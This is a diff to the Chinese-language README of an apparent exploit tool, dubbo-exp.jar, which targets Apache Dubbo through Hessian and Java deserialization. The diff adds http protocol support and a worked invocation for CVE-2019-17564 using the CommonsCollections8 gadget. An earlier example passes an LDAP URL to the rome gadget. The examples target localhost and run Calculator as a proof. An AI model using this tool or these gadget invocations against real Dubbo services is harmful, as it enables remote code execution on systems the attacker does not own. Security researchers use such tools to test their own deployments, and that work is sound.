@@ -7,11 +7,11 @@ usage: java -jar exp.jar [OPTION]
 - -list             输出所有payload信息
 - -p <arg>          payload名称
 - -param <arg>      payload入参
-- -protocol <arg>   [dubbo] 通讯协议名称，默认缺省dubbo
+- -protocol <arg>   [dubbo|http] 通讯协议名称，默认缺省dubbo
 - -s <arg>          [hessian|java] 序列化类型，默认缺省hessian
 - -t <arg>          目标，例：127.0.0.1:20880
 
-例：
+例（测试dubbo默认缺省情况下使用的dubbo协议+hessian2反序列化）：
 ```
 java -jar dubbo-exp.jar
 -t
@@ -24,6 +24,20 @@ hessian
 rome
 -param
 ldap://127.0.0.1:43658/Calc
+```
+
+例（测试dubbo在使用http协议+java反序列化，dubbo < 2.7.5前使用http协议，后续改为了jsonrpc）CVE-2019-17564：
+```
+-t
+127.0.0.1:8080/org.apache.dubbo.samples.http.api.DemoService
+-protocol
+http
+-s
+java
+-p
+CommonsCollections8
+-param
+/System/Applications/Calculator.app/Contents/MacOS/Calculator
 ```
 
 ## payloads列表
@@ -153,4 +167,4 @@ ldap://127.0.0.1:43658/Calc
 2. 需要入参数量：1
 3. 参数说明：arg[0]=dns server url
 4. 序列化类型：java
-5. 依赖：
+5. 依赖：java runtime
